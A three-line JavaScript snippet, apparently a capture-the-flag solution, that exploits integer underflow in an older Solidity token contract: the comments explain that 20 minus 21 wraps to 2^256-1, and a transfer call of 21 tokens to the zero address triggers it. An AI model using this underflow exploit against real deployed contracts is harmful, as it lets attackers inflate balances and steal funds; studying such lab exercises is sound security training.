//in old versions of solidity there were unchecked math operations, so basically for uint256 20-21 gives not -1 obvisously but 2^256 - 1.
//make it undeflow
await contract.transfer('0x0000000000000000000000000000000000000000', 21) 